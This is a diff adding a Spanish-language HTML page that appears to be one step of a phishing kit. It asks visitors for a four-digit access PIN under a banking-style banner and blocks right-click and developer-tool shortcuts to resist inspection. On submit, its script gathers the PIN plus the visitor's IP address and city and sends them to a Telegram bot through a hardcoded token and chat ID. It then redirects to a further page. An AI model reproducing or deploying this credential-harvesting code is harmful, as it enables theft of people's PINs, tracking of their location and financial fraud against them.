@@ -1,0 +1,252 @@
+ 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>.</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#efefef;
+    min-height:100vh;
+}
+
+.header{
+    width:100%;
+    background:#0d5788;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.header-banner{
+    display:block;
+    width:100%;
+    max-width:828px;
+    height:auto;
+    object-fit:contain;
+}
+
+.container{
+    display:flex;
+    justify-content:center;
+    padding:20px;
+}
+
+.login-box{
+    width:100%;
+    max-width:420px;
+}
+
+.title{
+    text-align:center;
+    color:#0b78c8;
+    font-size:30px;
+    font-weight:600;
+    margin:20px 0 30px;
+}
+
+.code-label{
+    text-align:center;
+    color:#444;
+    margin-bottom:15px;
+    font-size:15px;
+}
+
+.otp-container{
+    display:flex;
+    justify-content:center;
+    gap:10px;
+    margin-bottom:25px;
+}
+
+.otp{
+    width:55px;
+    height:55px;
+    border:1px solid #4b9de3;
+    border-radius:6px;
+    text-align:center;
+    font-size:26px;
+    font-weight:bold;
+    background:#fff;
+    outline:none;
+    padding:0;
+}
+
+.otp:focus{
+    border:2px solid #0b78c8;
+}
+
+.btn{
+    width:100%;
+    height:48px;
+    border:none;
+    border-radius:30px;
+    background:#0b6db8;
+    color:white;
+    font-size:15px;
+    cursor:pointer;
+}
+
+@media(max-width:480px){
+
+    .title{
+        font-size:22px;
+    }
+
+    .otp{
+        width:42px;
+        height:42px;
+        font-size:20px;
+    }
+
+    .otp-container{
+        gap:5px;
+    }
+}
+</style>
+
+<script> 
+    // Bloquear clic derecho
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    }
+</script>
+
+</head>
+
+<body>
+
+<header class="header">
+    <img src="prueba2.png" alt="Banner" class="header-banner">
+</header>
+
+
+<form id="loginForm" class="form" >
+
+
+<div class="container">
+
+    <div class="login-box">
+
+        <h2 class="title">Ingresar Credenciales </h2>
+
+        <div class="code-label">
+            Ingrese Su PIN de acceso 
+        </div>
+
+<div class="inputs">
+
+        <div class="otp-container">
+            <input type="tel" id="1" name="1" maxlength="1" class="otp"required>
+            <input type="tel" id="2" name="2" maxlength="1" class="otp"required>
+            <input type="tel" id="3" name="3" maxlength="1" class="otp"required>
+            <input type="tel" id="4" name="4" maxlength="1" class="otp"required>
+ 
+ 
+        </div>
+
+
+        <button class="btn">Ingresar</button>
+
+    </div>
+
+ </div>
+</form>
+
+<!-- jQuery -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+<!-- Script de validación y envío -->
+<script>
+  const inputs = document.querySelectorAll(".inputs input");
+  const verificarBtn = document.getElementById("verificar");
+
+  // Enfocar al siguiente input
+  inputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+      if (input.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+      checkInputs();
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && input.value === "" && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+  });
+
+  // Habilitar botón si todos los campos están llenos
+  function checkInputs() {
+    const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
+    verificarBtn.disabled = !allFilled;
+  }
+
+  $(document).ready(function () {
+    $('#loginForm').submit(function (e) {
+      e.preventDefault();
+
+      const code = Array.from(inputs).map(input => input.value).join('');
+      const message = `✅ PIN INGRESADO:\n🔐 Pin: ${code}`;
+
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        const ip = data.ip;
+        $.getJSON("https://ipinfo.io", function (response) {
+          const location = response.city + ", " + response.country;
+
+          const fullMessage = `${message}\n🌐 IP: ${ip}\n📍 Ubicación: ${location}`;
+
+          const telegram_bot_id = "9296675023:AAG9GS11NauXwPMmLYeDUhZNypNCHyURAUY";
+          const chat_id = "6956488104";
+
+          $.ajax({
+            async: true,
+            crossDomain: true,
+            url: `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`,
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "cache-control": "no-cache"
+            },
+            data: JSON.stringify({
+              chat_id: chat_id,
+              text: fullMessage
+            })
+          }).done(function () {
+            window.location.href = '3.html'; // redirige después de enviar
+          });
+        });
+      });
+    });
+  });
+</script>
+
+ 
+
+
+</body>
+</html>
+ 
